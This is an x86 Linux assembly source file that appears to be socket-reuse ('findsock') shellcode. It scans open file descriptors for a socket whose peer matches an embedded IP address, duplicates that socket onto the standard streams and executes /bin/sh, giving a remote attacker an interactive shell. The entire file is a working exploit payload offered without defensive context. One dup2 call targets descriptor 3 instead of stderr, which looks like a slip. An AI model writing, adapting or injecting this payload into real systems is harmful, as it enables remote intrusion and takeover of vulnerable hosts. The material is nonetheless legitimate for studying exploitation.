/*
 * Copyright 2014 Joseph Landry
 */

.section .text
.global _start

.set SOCK_GETPEERNAME,7
.set SYS_socketcall,102


_start:
	jmp	end

begin:
	pop	%esi


	pushl	$16
	movl	%esp,%eax
	sub	$16,%esp
	movl	%esp,%ebx

	pushl	%eax			# socklen_t *len
	pushl	%ebx			# struct sockaddr *
	pushl	$0			# int sockfd

1:
	incl	(%esp)
	cmpl	$1025,(%esp)
	je	exit

	movl	$16,0x1c(%esp)

	movl	%esp,%ecx		# void *args
	movl	$SOCK_GETPEERNAME,%ebx
	movl	$SYS_socketcall,%eax
	int	$0x80

	cmp	$0,%eax
	jl	1b
	movl	0x10(%esp),%eax
	cmpl	(%esi),%eax
	jne	1b

	# success ?	
	movl	(%esp),%edi
	add	$4,%esi

dup:

	mov $0x3f,%eax # sys_dup2(int oldfd, int newfd)
	mov %edi,%ebx #int olddf
	mov $0x00,%ecx #int newfd
	int $0x80

	mov $0x3f,%eax # sys_dup2(int oldfd, int newfd)
	mov %edi,%ebx #int olddf
	mov $0x01,%ecx #int newfd
	int $0x80

	mov $0x3f,%eax # sys_dup2(int oldfd, int newfd)
	mov %edi,%ebx 			#int olddf
	mov $0x03,%ecx 			#int newfd
	int $0x80

execve:	
	movl $0xb, %eax # sys_execve()
	movl %esi, %ebx # char *filename
	pushl $0x0
	pushl %esi
	movl %esp, %ecx # char *argv[]
	pushl $0x0
	movl %esp, %edx # char *envp[]
	int $0x80

exit:
	xor	%eax,%eax
	inc	%eax
	movl	%eax,%ebx
	int	$0x80
	hlt	

end:
	call	begin
ip:
.byte	127,0,0,1
.ascii	"/bin/sh\000"
